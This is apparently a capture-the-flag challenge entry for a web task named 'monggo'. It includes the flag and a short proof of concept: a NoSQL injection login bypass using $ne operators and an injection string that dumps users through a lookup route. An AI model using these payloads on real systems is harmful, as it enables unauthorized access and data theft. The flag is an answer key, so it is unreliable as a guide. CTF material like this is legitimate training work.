# Challenge Name:
monggo

## Description:
monggo mas, ini webnya

## Category:
Web

## File:
./monggo.zip

## Flag:
`STORM{monggo_no_sql_nya_0efc1da0e122}`

## Points:
500

## Author:
k.eii

## PoC
NoSQL Injection auth bypass, json post
```{"username":{"$ne": "x"},"password":{"$ne": "x"}}```
retrieve users on /lookup/{payload}
```' || 'a' == 'a```